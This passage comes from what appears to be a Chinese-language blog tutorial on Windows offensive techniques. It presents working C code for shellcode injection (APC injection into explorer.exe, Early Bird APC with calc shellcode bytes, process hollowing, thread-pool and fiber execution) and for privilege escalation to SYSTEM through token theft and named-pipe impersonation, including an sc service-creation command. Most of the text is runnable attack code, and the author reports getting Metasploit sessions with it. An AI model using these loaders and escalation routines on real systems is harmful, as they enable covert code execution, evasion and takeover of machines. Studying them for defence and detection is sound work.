线程信息结构体\n    THREADENTRY32 te;\n    ZeroMemory(&amp;te, sizeof(te));\n    te.dwSize = sizeof(te);\n\n    // 遍历线程\n    BOOL flag = Thread32First(hSnapshotThread, &amp;te);\n    while (flag)\n    &#123;\n        // 获取进程对应的线程ID\n        if (te.th32OwnerProcessID == pid)\n        &#123;\n            // 获取线程句柄\n            HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);\n            // 加入APC队列\n            if (hThread &amp;&amp; QueueUserAPC((PAPCFUNC)lpAddress, hThread, NULL))\n            &#123;\n                // 挂起3s\n                SleepEx(3000, TRUE);\n                printf(&quot;running code\\n&quot;);\n                CloseHandle(hThread);\n            &#125;\n        &#125;\n        flag = Thread32Next(hSnapshotThread, &amp;te);\n    &#125;\n    return TRUE;\n&#125;\n\nint main()\n&#123;\n    // 获取调试权限\n    BOOL bRet = EnableDebugAbility();\n    if (!bRet) return 0;\n\n    unsigned char shellcode[] = &quot;&quot;;\n\n    char processName[] = &quot;explorer.exe&quot;;\n    // 目标进程线程数\n    int cntThreads = 0;\n    // 目标进程pid\n    DWORD pid = GetPid(processName,&amp;cntThreads);\n    if (pid == -1 || cntThreads &lt;= 0) return 0;\n   \n   \n    // 打开目标进程\n    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\n    if (!hProcess) return 0;\n    // 分配空间\n    LPVOID lpAddress = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n    if (!lpAddress) return 0;\n    // 写入shellcode\n    bRet = WriteProcessMemory(hProcess, lpAddress, shellcode, sizeof(shellcode), NULL);\n    if (!bRet) return 0;\n\n    // 执行代码\n    bRet = RunCode(lpAddress, pid);\n    if (!bRet) return 0;\n\n    \n    CloseHandle(hProcess);\n&#125;\n</code></pre>\n<p>　　会收到大量的session。</p>\n<h4 id=\"Early-Bird-APC注入\"><a href=\"#Early-Bird-APC注入\" class=\"headerlink\" title=\"Early Bird APC注入\"></a>Early Bird APC注入</h4><p>　　此注入手法和前面的APC注入更简单，大致流程就是将创建一个挂起的进程，然后将此线程加入apc队列，最后恢复线程。代码胜千言，非常简单，不多描述了。运行一下代码，弹出计算器。</p>\n<pre><code class=\"c\">#include &lt;Windows.h&gt;\n#include &lt;stdio.h&gt;\n\nint main()\n&#123;\n    // 执行计算器的shellcode\n    unsigned char shellcode[] =\n        &quot;\\x55\\x64\\x8B\\x35\\x30\\x00\\x00\\x00\\x8B\\x76\\x0C\\x8B\\x76&quot;\n        &quot;\\x1C\\x8B\\x6E\\x08\\x8B\\x7E\\x20\\x8B\\x36\\x38\\x4F\\x18\\x75&quot;\n        &quot;\\xF3\\x8B\\xFD\\x83\\xEC\\x64\\x8B\\xEC\\x8B\\x47\\x3C\\x8B\\x54&quot;\n        &quot;\\x07\\x78\\x03\\xD7\\x8B\\x4A\\x18\\x8B\\x5A\\x20\\x03\\xDF\\x49&quot;\n        &quot;\\x8B\\x34\\x8B\\x03\\xF7\\xB8\\x47\\x65\\x74\\x50\\x39\\x06\\x75&quot;\n        &quot;\\xF1\\xB8\\x72\\x6F\\x63\\x41\\x39\\x46\\x04\\x75\\xE7\\x8B\\x5A&quot;\n        &quot;\\x24\\x03\\xDF\\x66\\x8B\\x0C\\x4B\\x8B\\x5A\\x1C\\x03\\xDF\\x8B&quot;\n        &quot;\\x04\\x8B\\x03\\xC7\\x89\\x45\\x4C\\x6A\\x00\\x68\\x61\\x72\\x79&quot;\n        &quot;\\x41\\x68\\x4C\\x69\\x62\\x72\\x68\\x4C\\x6F\\x61\\x64\\x54\\x57&quot;\n        &quot;\\xFF\\x55\\x4C\\x89\\x45\\x50\\x6A\\x00\\x68\\x65\\x73\\x73\\x00&quot;\n        &quot;\\x68\\x50\\x72\\x6F\\x63\\x68\\x45\\x78\\x69\\x74\\x54\\x57\\xFF&quot;\n        &quot;\\x55\\x4C\\x89\\x45\\x54\\x6A\\x00\\x68\\x72\\x74\\x00\\x00\\x68&quot;\n        &quot;\\x6D\\x73\\x76\\x63\\x54\\xFF\\x55\\x50\\x8B\\xF8\\x6A\\x00\\x68&quot;\n        &quot;\\x65\\x6D\\x00\\x00\\x68\\x73\\x79\\x73\\x74\\x54\\x57\\xFF\\x55&quot;\n        &quot;\\x4C\\x89\\x45\\x5C\\x6A\\x00\\x68\\x63\\x61\\x6C\\x63\\x54\\xFF&quot;\n        &quot;\\x55\\x5C\\xFF\\x55\\x54\\xC3\\xCC&quot;;\n\n    STARTUPINFO si = &#123; 0 &#125;;\n    PROCESS_INFORMATION pi = &#123; 0 &#125;;\n    si.cb = sizeof(si);\n\n    // 创建挂起的cmd进程\n    CreateProcessA(NULL, &quot;cmd&quot;, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi);\n    \n    // 分配一块内存空间\n    LPVOID lpAddress = VirtualAllocEx(pi.hProcess,NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\n    if (!lpAddress) return 0;\n\n    // 写入shellcode\n    WriteProcessMemory(pi.hProcess, lpAddress, shellcode, sizeof(shellcode), NULL);\n    // 将此线程加入apc队列\n    QueueUserAPC((PAPCFUNC)lpAddress, pi.hThread, NULL);\n\n    // 恢复线程\n    ResumeThread(pi.hThread);\n\n    CloseHandle(pi.hThread);\n    CloseHandle(pi.hProcess);\n\n&#125;\n</code></pre>\n<h4 id=\"傀儡进程\"><a href=\"#傀儡进程\" class=\"headerlink\" title=\"傀儡进程\"></a>傀儡进程</h4><p>　　傀儡进程，英文名称为(Process Hollowing)。傀儡进程的创建原理就是修改某一进程的内存数据，向内存中写入shellcode代码，并修改该进程的执行流程，从而执行shellcode代码。这样，进程还是原来的进程，但执行的操作却替换了。</p>\n<p>　　傀儡进程对于 shellcode 注入来说有点过于重量级，因为镂空一个 PE 文件写入 shellcode 动静较大。所谓的镂空就是使用 <code>NtUnmapViewOfSection</code>卸载正在执行的PE文件在内存中的映像。所以在进程 shellcode 注入的时候，更好地选择可能是不镂空进程，而直接修改进程的 EIP&#x2F;RIP ，指向 shellcode 在内存中的起始地址。</p>\n<p>　　执行流程如下<br>　　1.调用<code>CreateProcess</code>创建进程，并设置进程标志为<code>CREATE_SUSPENDED</code>进行挂起<br>　　2.使用<code>VirtualAllocEx</code>申请一个可读、可写、可执行的内存空间<br>　　3.调用<code>WriteProcessMemory</code>将Shellcode数据写入刚申请的内存中。<br>　　4.调用<code>GetThreadContext</code>，设置获取标志为<code>CONTEXT_FULL</code>，即获取新进程中所有线程的上下文。<br>　　5.修改线程上下文中EIP&#x2F;RIP的值为申请的内存的首地址，通过<code>SetThreadContext</code>函数设置回主线程中。<br>　　6.调用<code>ResumeThread</code>恢复主线程。<br>　　其中64位进程应该修改Rip，32位进程应该修改Eip。<br>　　示例代码如下</p>\n<pre><code class=\"c\">#include &lt;Windows.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main()\n&#123;\n\n    // shellcode\n    unsigned char shellcode[] = &quot;&quot;;\n\n    // shellcode大小\n    int size = sizeof(shellcode);\n\n    // 初始化结构体\n    STARTUPINFO si = &#123; 0 &#125;;\n    PROCESS_INFORMATION pi = &#123; 0 &#125;;\n    ZeroMemory(&amp;si, sizeof(si));\n    ZeroMemory(&amp;pi, sizeof(pi));\n    si.cb = sizeof(si);\n\n    BOOL bRet = FALSE;\n    // 创建挂起进程\n    bRet = CreateProcessA(NULL, (LPSTR)&quot;notepad.exe&quot;, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, (LPSTARTUPINFOA)&amp;si, &amp;pi);\n    if (!bRet)\n    &#123;\n        printf(&quot;CreateProcess Error&quot;);\n        return;\n    &#125;\n\n    // 在进程中申请空间\n    LPVOID lpAddress = VirtualAllocEx(pi.hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n    if (!lpAddress)\n    &#123;\n        printf(&quot;VirtualAllocEx Error&quot;);\n        return;\n    &#125;\n    \n    // 写入shellcode数据\n    bRet = WriteProcessMemory(pi.hProcess, lpAddress, shellcode, size, NULL);\n    if (!bRet)\n    &#123;\n        printf(&quot;WriteProcessMemory Error&quot;);\n        return;\n    &#125;\n\n    // 获取线程上下文\n    CONTEXT threadContext;\n    threadContext.ContextFlags = CONTEXT_FULL;\n    bRet = GetThreadContext(pi.hThread, &amp;threadContext);\n    if (!bRet)\n    &#123;\n        printf(&quot;GetThreadContext Error&quot;);\n        return;\n    &#125;\n\n//\t修改线程上下文中EIP / RIP的值为申请的内存的首地址\n#ifdef _WIN64 \n    // 64位    \n    threadContext.Rip = (DWORD64)lpAddress;\n#else     \n    // 32位\n    threadContext.Eip = (DWORD)lpAddress;\n#endif\n\n    // 设置挂起进程的线程上下文\n    bRet = SetThreadContext(pi.hThread, &amp;threadContext);\n    if (!bRet)\n    &#123;\n        printf(&quot;SetThreadContext Error&quot;);\n        return;\n    &#125;\n\n    // 恢复主线程\n    ResumeThread(pi.hThread);\n    CloseHandle(pi.hThread);\n    CloseHandle(pi.hProcess);\n&#125;\n</code></pre>\n<p> 运行后，msf上线，notepad已成为傀儡进程 </p>\n<h4 id=\"线程池\"><a href=\"#线程池\" class=\"headerlink\" title=\"线程池\"></a>线程池</h4><p>　　这里就只写两种，<a href=\"https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-via-createthreadpoolwait\">代码灵感来源</a>。我看好多网上都写的这种方法。</p>\n<p>　　后来花了几个小时，学了线程池，于是发现有很多很多方法去执行shellcode。希望大家多多思考吧。</p>\n<p>　　线程池的方式让我们不再使用<code>CreateThread</code>，更多的线程池<a href=\"https://docs.microsoft.com/en-us/windows/win32/procthread/thread-pool-api\">api</a>。这些线程池api都可以替代<code>CreateThread</code></p>\n<p>　　<strong>第一种</strong>，创建工作项</p>\n<pre><code class=\"c\">#include &lt;stdio.h&gt;\n#include &lt;Windows.h&gt;\n\nint main()\n&#123;\n    unsigned char shellcode[] = &quot;\\x55\\x64&quot;;\n\n    // 获取大小\n    int size = sizeof(shellcode);\n    LPVOID lpAddress = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n    memcpy(lpAddress, shellcode, size);\n    \n    // 创建一个线程池工作项\n    PTP_WORK pwk = CreateThreadpoolWork(lpAddress, NULL, NULL);\n    SubmitThreadpoolWork(pwk);\n    WaitForThreadpoolWorkCallbacks(pwk, FALSE);\n    CloseThreadpoolWork(pwk);\n    return 0;\n&#125;\n</code></pre>\n<p>　　<strong>第二种</strong>，定时器</p>\n<pre><code class=\"c\">#include &lt;stdio.h&gt;\n#include &lt;Windows.h&gt;\n\nint main()\n&#123;\n    unsigned char shellcode[] =&quot;\\x55\\x64&quot;;\n\n    // 获取大小\n    int size = sizeof(shellcode);\n    LPVOID lpAddress = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n    memcpy(lpAddress, shellcode, size);\n    \n    PTP_TIMER pti = CreateThreadpoolTimer(lpAddress, NULL, NULL);\n\n    ULARGE_INTEGER ulRelativeTimer;\n    ulRelativeTimer.QuadPart = (LONGLONG)-(10000000);\n    FILETIME ftRelativeTimer;\n    ftRelativeTimer.dwHighDateTime = ulRelativeTimer.HighPart;\n    ftRelativeTimer.dwLowDateTime = ulRelativeTimer.LowPart;\n    SetThreadpoolTimer(pti, &amp;ftRelativeTimer, 0, 0);\n\n    Sleep(2000);\n    CloseThreadpoolTimer(pti);\n    return 0;\n&#125;\n</code></pre>\n<h4 id=\"纤程\"><a href=\"#纤程\" class=\"headerlink\" title=\"纤程\"></a>纤程</h4><p>　　<a href=\"https://docs.microsoft.com/en-us/windows/win32/procthread/fibers\">纤程</a>官方解释，简单来说线程是进程内部的实体，那么纤程则又是纤程内部的实体。</p>\n<p>　　使用纤程的步骤<br>　　1.使用<code>ConvertThreadToFiber </code>将主线程转换成纤程，这是必须的一步<br>　　2.使用<code>CreateFiber</code>创建一个纤程，并指向shellcode地址<br>　　3.最后使用<code>SwitchToFiber</code>，运行前面我们创建的纤程</p>\n<p>　　示例代码</p>\n<pre><code class=\"c\">#include &lt;stdio.h&gt;\n#include &lt;Windows.h&gt;\n\nint main()\n&#123;\n    // 执行计算器的shellcode\n    unsigned char shellcode[] = &quot;&quot;;\n\n    // 获取大小\n    int size = sizeof(shellcode);\n    \n    LPVOID lpAddress = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n    memcpy(lpAddress, shellcode, size);\n    // 将线程转换成纤程\n    ConvertThreadToFiber(NULL);\n    // 创建一个新的纤程\n    PVOID fiber = CreateFiber(0, lpAddress, NULL);\n    // 执行纤程\n    SwitchToFiber(fiber);\n    return 0;\n&#125;\n</code></pre>\n<h3 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h3><p>　　提权顾名思义就是提升自己的权限，不论是从administrator提升到system，还是普通用户提示到administrator都算提权。</p>\n<h4 id=\"令牌窃取\"><a href=\"#令牌窃取\" class=\"headerlink\" title=\"令牌窃取\"></a>令牌窃取</h4><p>　　令牌窃取与伪造，英文名:Token Impersonation&#x2F;Theft。这里不讲令牌的详细知识。说一下主令牌(primary token)和模拟令牌(impersonation token)的区别。</p>\n<p>　　主令牌应该叫进程令牌，模拟令牌应该叫线程令牌。主令牌只能附加给进程，模拟令牌只能附加给线程。换言之，如果使用主令牌，必须启动一个新的进程。而想在当前进程获取一个高权限，可以使用模拟令牌，将其附加给一个新的线程。</p>\n<p>　　使用<strong>主令牌</strong>，提权到system的流程如下<br>　　<a href=\"https://cdn.jsdelivr.net/gh/SnowMeteors/Resources@master/img/win32/20220320203011.png\"><img src=\"https://cdn.jsdelivr.net/gh/SnowMeteors/Resources@master/img/win32/20220320203011.png\" alt=\"img\"></a></p>\n<p>1.用户以管理员权限打开此进程，这样才能启用<code>SE_DEBUG_NAME</code>权限。<br>　　判断进程是否有管理员权限，只需要调用<code>IsUserAnAdmin()</code>函数，头文件为&lt;shlobj_core.h&gt;。并启用<code>SE_DEBUG_NAME</code>权限代码如下</p>\n<pre><code class=\"c\">#include &lt;Windows.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;ShlObj_core.h&gt;\n#include &lt;stdlib.h&gt;\n\n// 启用调试权限\nBOOL EnableDebugAbility()\n&#123;\n    // 令牌句柄\n    HANDLE hProcessToken = NULL;\n    // 1.打开进程访问令牌\n    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hProcessToken))\n    &#123;\n        printf(&quot;error open process token\\n&quot;);\n        return FALSE;\n    &#125;\n\n    // 2.取得SeDebugPrivilege特权的LUID值\n    LUID luid;\n    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;luid))\n    &#123;\n        printf(&quot;error lookup value\\n&quot;);\n        return FALSE;\n    &#125;\n\n    // 3.调整访问令牌特权\n    TOKEN_PRIVILEGES token;\n    token.PrivilegeCount = 1;\n    token.Privileges[0].Luid = luid;\n    // 使特权有效\n    token.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n\n    if (!AdjustTokenPrivileges(hProcessToken, FALSE, &amp;token, 0, NULL, NULL))\n    &#123;\n        printf(&quot;error adjust token\\n&quot;);\n        return FALSE;\n    &#125;\n\n    CloseHandle(hProcessToken);\n    return TRUE;\n\n&#125;\n\nint main(int argc, char* argv[])\n&#123;\n\n    // 启用调试权限失败 或者 没有管理员权限\n    if (!EnableDebugAbility() || !IsUserAnAdmin())\n    &#123;\n        printf(&quot;enable debug error or not admin\\n&quot;);\n        return;\n    &#125;\n\n    return 0;\n&#125;\n</code></pre>\n<p>　　2.使用<code>OpenProcess</code>，以<code>PROCESS_QUERY_INFORMATION</code>，权限打开。获取到进程句柄</p>\n<pre><code class=\"c\">// 进程pid\nDWORD pid = atoi(argv[1]);\n// 获取进程句柄\nHANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);\nif (!hProcess)\n&#123;\n    printf(&quot;OpenProcess Error\\n&quot;);\n    return;\n&#125;\n\nprintf(&quot;OpenProcess Sucess\\n&quot;);\n</code></pre>\n<p>　　 从图中可看到可打开<code>winlogon</code>进程，无法打开<code>wininit</code>进程<br>　　<a href=\"https://cdn.jsdelivr.net/gh/SnowMeteors/Resources@master/img/win32/20220320210159.jpg\"><img src=\"https://cdn.jsdelivr.net/gh/SnowMeteors/Resources@master/img/win32/20220320210159.jpg\" alt=\"img\"></a><br>　　原因在于<code>wininit</code>是个保护进程<code>PsProtectedSignerWindows</code>。<br>　　<a href=\"https://cdn.jsdelivr.net/gh/SnowMeteors/Resources@master/img/win32/20220320210500.jpg\"><img src=\"https://cdn.jsdelivr.net/gh/SnowMeteors/Resources@master/img/win32/20220320210500.jpg\" alt=\"img\"></a><br>　　要想获取保护进程的句柄，只需要<code>OpenProcess</code>，以<code>PROCESS_QUERY_LIMITED_INFORMATION</code>权限打开即可 </p>\n<pre><code class=\"c\">// 获取进程句柄\nHANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);\nif (!hProcess)\n&#123;\n    hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);\n    if (!hProcess)\n    &#123;\n        printf(&quot;OpenProcess Error\\n&quot;);\n        return;\n    &#125;\n&#125;\n</code></pre>\n<p>3.使用获取目标进程的访问令牌。先看定义</p>\n<pre><code class=\"c\">BOOL OpenProcessToken(\n    HANDLE  ProcessHandle,\t// 进程句柄\n    DWORD   DesiredAccess,\t// 令牌的请求类型\n    PHANDLE TokenHandle\t\t// 返回令牌句柄\n);\t\t\t\t\t\t\t// 成功返回非0 失败返回0\n</code></pre>\n<p>　　<code>DesiredAccess</code>这里只需要填写TOKEN_QUERY 和TOKEN_DUPLICATE即可</p>\n<pre><code class=\"c\">// 获取令牌句柄\nHANDLE hToken = NULL;\nif (OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &amp;hToken))\n&#123;\n    printf(&quot;OpenProcessToken error\\n&quot;);\n    return;\n&#125;\n</code></pre>\n<p>　　4.使用来复制一个主令牌，此函数可以创建主令牌或模拟令牌，定义</p>\n<pre><code class=\"c\">BOOL DuplicateTokenEx(\n    HANDLE                       hExistingToken,\t// 令牌句柄\n    DWORD                        dwDesiredAccess,\t// 令牌访问权限 使用MAXIMUM_ALLOWED允许获取的最大权限\n    LPSECURITY_ATTRIBUTES        lpTokenAttributes, // 指向SECURITY_ATTRIBUTES指针 这里填NULL即可\n    SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,// 令牌的模拟等级 这里填SecurityImpersonation\n    TOKEN_TYPE                   TokenType,\t\t\t// 令牌类型\n    PHANDLE                      phNewToken\t\t\t// 接收新令牌的句柄指针\n);\t\t\t\t\t\t\t\t\t\t\t\t\t// 成功返回非0 失败返回0\n</code></pre>\n<p>　　TokenType的值有两种: 主令牌 <code>TokenPrimary</code>、模拟令牌 <code>TokenImpersonation</code></p>\n<pre><code class=\"c\">// 复制令牌\nHANDLE hNewToken = NULL;\nif (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED,NULL, SecurityImpersonation,TokenPrimary,&amp;hNewToken))\n&#123;\n    printf(&quot;DuplicateTokenEx error\\n&quot;);\n    return;\n&#125;\n</code></pre>\n<p>　　函数成功执行后，将保存新复制的令牌　　5.最后使用复制的令牌去创建一个进程，这里使用，它和的用法非常相似</p>\n<pre><code class=\"c\">BOOL CreateProcessWithTokenW(\n    HANDLE                hToken,\t\t\t\t// 令牌句柄\n    DWORD                 dwLogonFlags,\t\t\t// 登录选项 这里填0\n    LPCWSTR               lpApplicationName,\t// 进程名\n    LPWSTR                lpCommandLine,\t\t// 命令行参数\n    DWORD                 dwCreationFlags,\t\t// 创建进程方式\n    LPVOID                lpEnvironment,\t\t// 填NULL\n    LPCWSTR               lpCurrentDirectory,\t// 填NULL\n    LPSTARTUPINFOW        lpStartupInfo,\t\t// 启动进程相关信息\n    LPPROCESS_INFORMATION lpProcessInformation  // 子进程的相关信息\n);\t\t\t\t\t\t\t\t\t\t\t\t// 成功返回非0 失败返回0\n</code></pre>\n<pre><code class=\"c\">STARTUPINFO si = &#123; 0 &#125;;\nPROCESS_INFORMATION pi = &#123; 0 &#125;;\nZeroMemory(&amp;si, sizeof(si));\nZeroMemory(&amp;pi, sizeof(pi));\nsi.cb = sizeof(si);\n\n// 使用新令牌创建进程\nbRet = CreateProcessWithTokenW(hNewToken, 0, L&quot;cmd.exe&quot;, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &amp;si, &amp;pi);\nif (!bRet)\n&#123;\n    printf(&quot;CreateProcessWithTokenW error\\n&quot;);\n    return;\n&#125;\n</code></pre>\n<p>　 成功调用后，会打开一个新的cmd窗口<br>　　<a href=\"https://cdn.jsdelivr.net/gh/SnowMeteors/Resources@master/img/win32/20220320215932.jpg\"><img src=\"https://cdn.jsdelivr.net/gh/SnowMeteors/Resources@master/img/win32/20220320215932.jpg\" alt=\"img\"></a> </p>\n<p>　　参考文章<br>　　<a href=\"https://www.anquanke.com/post/id/187895#h2-2\">Windows访问令牌窃取攻防技术研究</a><br>　　<a href=\"https://www.anquanke.com/post/id/192892\">详解令牌篡改攻击（Part 1）</a><br>　　<a href=\"https://www.anquanke.com/post/id/193843\">详解令牌篡改攻击（Part 2）</a><br>　　<a href=\"https://0x00-0x00.github.io/research/2018/10/17/Windows-API-and-Impersonation-Part1.html\">Windows API and Impersonation Part 1 - How to get SYSTEM using Primary Tokens</a><br>　　<a href=\"https://0x00-0x00.github.io/research/2018/10/21/Windows-API-And-Impersonation-Part-2.html\">Windows API and Impersonation Part 2 - How to get SYSTEM using Impersonation Tokens</a></p>\n<h4 id=\"命名管道-1\"><a href=\"#命名管道-1\" class=\"headerlink\" title=\"命名管道\"></a>命名管道</h4><p>　　先来看一个简单的例子，管道服务端代码</p>\n<pre><code class=\"c\">#include &lt;Windows.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;ShlObj_core.h&gt;\n\n#define PIPENAME &quot;\\\\\\\\.\\\\pipe\\\\elevate&quot;\n\nint main()\n&#123;\n    // 创建命名管道\n    HANDLE hPipe = CreateNamedPipe(\n        PIPENAME,\n        PIPE_ACCESS_DUPLEX,\n        PIPE_TYPE_MESSAGE | PIPE_WAIT,\n        PIPE_UNLIMITED_INSTANCES,\n        0, 0, 0, NULL\n    );\n\n    if (!hPipe)\n    &#123;\n        printf(&quot;[-] Create Named Pipe Fail\\n&quot;);\n        return 0;\n    &#125;\n    printf(&quot;[+] Create Named Pipe %s\\n&quot;, PIPENAME);\n\n    printf(&quot;[+] Waiting for pipe connection...\\n&quot;);\n    // 等待客户端连接\n    ConnectNamedPipe(hPipe, NULL);\n\n    // 接收客户端数据 \n    char buffer[256] = &#123; 0 &#125;;\n    ZeroMemory(buffer, sizeof(buffer));\n\n    if (!ReadFile(hPipe, buffer, sizeof(buffer), 0, NULL))\n    &#123;\n        printf(&quot;[-] Disconnect Named Pipe\\n&quot;);\n        return 0;\n    &#125;\n    printf(&quot;[+] RecvData is %s&quot;, buffer);\n\n    DisconnectNamedPipe(hPipe);\n    CloseHandle(hPipe);\n    return 0;\n&#125;\n</code></pre>\n<p>　　运行后，新cmd窗口输入。管道服务端将会收到消息　</p>\n<p>而管道提权，最重要的一个api就是，它允许进程模拟另一个进程的访问令牌，</p>\n<pre><code class=\"c\">BOOL ImpersonateNamedPipeClient(\n  [in] HANDLE hNamedPipe\t\t// 命名管道句柄\n);\t\t\t\t\t\t\t\t// 成功返回 非0 失败返回 0\n</code></pre>\n<p>　　只有管道服务端能调用这个函数，并且服务端必须要有<strong>SeImpersonatePrivilege</strong>权限。</p>\n<p>　　管理员拥有<strong>SeImpersonatePrivilege</strong>权限</p>\n<p>　　微软提示使用<code>ImpersonateNamedPipeClient</code>后，要将本线程中的线程令牌使用<code>DuplicateTokenEx</code>转换成进程令牌。之后就可以使用<code>CreateProcessWithTokenW</code>用新令牌创建新进程了。这里和前面的令牌窃取流程都是一样的</p>\n<pre><code class=\"c\">#include &lt;Windows.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;ShlObj_core.h&gt;\n\n#define PIPENAME &quot;\\\\\\\\.\\\\pipe\\\\elevate&quot;\n\nint main()\n&#123;\n    // 创建命名管道\n    HANDLE hPipe = CreateNamedPipe(\n        PIPENAME,\n        PIPE_ACCESS_DUPLEX,\n        PIPE_TYPE_MESSAGE | PIPE_WAIT,\n        PIPE_UNLIMITED_INSTANCES,\n        0, 0, 0, NULL\n    );\n\n    if (!hPipe)\n    &#123;\n        printf(&quot;[-] Create Named Pipe Fail\\n&quot;);\n        return 0;\n    &#125;\n    printf(&quot;[+] Create Named Pipe %s\\n&quot;, PIPENAME);\n\n    printf(&quot;[+] Waiting for pipe connection...\\n&quot;);\n    // 等待客户端连接\n    ConnectNamedPipe(hPipe, NULL);\n\n    // 接收客户端数据 \n    char buffer[256] = &#123; 0 &#125;;\n    ZeroMemory(buffer, sizeof(buffer));\n    \n    // 如果没有这行 提权失败\n    if (!ReadFile(hPipe, buffer, sizeof(buffer), 0, NULL))\n    &#123;\n        printf(&quot;[-] Disconnect Named Pipe\\n&quot;);\n        return 0;\n    &#125;\n    printf(&quot;[+] RecvData is %s&quot;, buffer);\n\n    // 拿到命名管道客户端线程令牌\n    BOOL ret = ImpersonateNamedPipeClient(hPipe);\n    // 获取令牌失败\n    if (!ret)\n    &#123;\n        printf(&quot;[-] Impersonate Client Fail\\n&quot;);\n        return 0;\n    &#125;\n    printf(&quot;[+] Impersonate Client Sucess\\n&quot;);\n    HANDLE token;\n    \n    // 获取线程令牌\n    ret = OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &amp;token);\n    if (!ret)\n    &#123;\n        printf(&quot;[!] Open Thread Token Fail\\n&quot;);\n        return 0;\n    &#125;\n    printf(&quot;[+] Open Thread Token Sucess\\n&quot;);\n\n    HANDLE hNewToken;\n    // 将线程令牌转换成进程令牌\n    ret = DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &amp;hNewToken);\n    if (!ret)\n    &#123;\n        printf(&quot;[!] Duplicate Token Fail\\n&quot;);\n        return 0;\n    &#125;\n    printf(&quot;[+] Duplicate Token Sucess\\n&quot;);\n\n    STARTUPINFO si = &#123; 0 &#125;;\n    PROCESS_INFORMATION pi = &#123; 0 &#125;;\n    si.cb = sizeof(si);\n\n    // 使用新令牌创建进程\n    ret = CreateProcessWithTokenW(hNewToken, 0, L&quot;cmd.exe&quot;, NULL, 0, NULL, NULL, (LPSTARTUPINFOW)&amp;si, &amp;pi);\n    if (ret) return 0;\n\n    printf(&quot;[+] Get System Sucess\\n&quot;);\n\n\n    CloseHandle(pi.hThread);\n    CloseHandle(pi.hProcess);\n    CloseHandle(hNewToken);\n    CloseHandle(token);\n    DisconnectNamedPipe(hPipe);\n    CloseHandle(hPipe);\n    return 0;\n&#125;\n</code></pre>\n<p>　　如果一个以system权限运行的cmd，执行，连接上我们写的命名管道服务端，岂不是就能获取到system权限。</p>\n<p>　　这里我用<code>psexec -i -s cmd</code>，运行了一个system权限的cmd<br>　<br>　　先运行管道服务端，在到system权限下的cmd，执行<code>echo hi &gt; \\\\.\\pipe\\elevate</code>，成功弹出了一个的cmd，并且是system权限</p>\n<p>　　到这里命名管道提权的原理就结束了，下面介绍msf的<a href=\"https://docs.rapid7.com/metasploit/getsystem-command-work/\">getsystem</a>，也使用了命名管道提权。cs官网也对msf的getsystem技术进行了<a href=\"https://www.cobaltstrike.com/blog/what-happens-when-i-type-getsystem/\">简答</a></p>\n<p>　　msf的getsystem中的命名管道提权流程</p>\n<pre><code class=\"none\">创建一个以system权限运行的windows服务\n生成一个进程，该进程创建一个命名管道等待来自服务的连接\nwindows服务启动，与命名管道建立连接\n命名管道成功连接后，该进程调用ImpersonateNamedPipeClient,以system用户创建模拟令牌\n</code></pre>\n<p>　　可看出它的提权流程，只比我们多了一步，即创建windows服务。</p>\n<p>　　如何让创建的服务以system权限运行，是一个问题。经过我后面的测试，发现默认情况下，使用<code>sc</code>命令创建的服务就拥有system权限。</p>\n<p>　　<code>sc create pipe BinPath= &quot;C:\\Windows\\System32\\cmd.exe /c echo  hacker &gt; \\\\.\\pipe\\elevate&quot; DisplayName= &quot;pipe&quot; &amp;&amp; sc start  pipe</code>，创建一个服务名为pipe的服务，再启动此服务。此时弹出新的cmd窗口，拥有system权限。</p>\n<p>　　存在pipe服务，要删除此服务请用<code>sc delete pipe</code><br>　<br>　　最开始，我的创建服务代码如下</p>\n<pre><code class=\"c\">// 使用sc创建服务并启动\nsystem(&quot;sc create pipe BinPath= \\&quot;C:\\\\Windows\\\\System32\\\\cmd.exe /c echo hacker &gt; \\\\\\\\.\\\\pipe\\\\elevate\\&quot; DisplayName= \\&quot;pipe\\&quot; &amp;&amp; sc start pipe&quot;);\nprintf(&quot;[+] Waiting for pipe connection...\\n&quot;);\n// 等待客户端连接\nConnectNamedPipe(hPipe, NULL);\n</code></pre>\n<p>　　运行后，管道并没有产生连接。仔细想想当服务启动的时候，管道都还没建立起来，自然而然也就不会连接成功。</p>\n<p>　　但如果将创建服务代码写到<code>ConnectNamedPipe(hPipe, NULL);</code>后面，这就会造成命名管道阻塞，一直在等待客户端连接，而后面的创建服务代码也不会执行。虽然可以采用非阻塞式命名管道，但我觉得太麻烦了。</p>\n<p>　　不就是要让创建命名管道后，再执行创建服务嘛。创建一个新的进程，或者线程问题不就解决了吗，示例代码</p>\n<pre><code class=\"c\">// 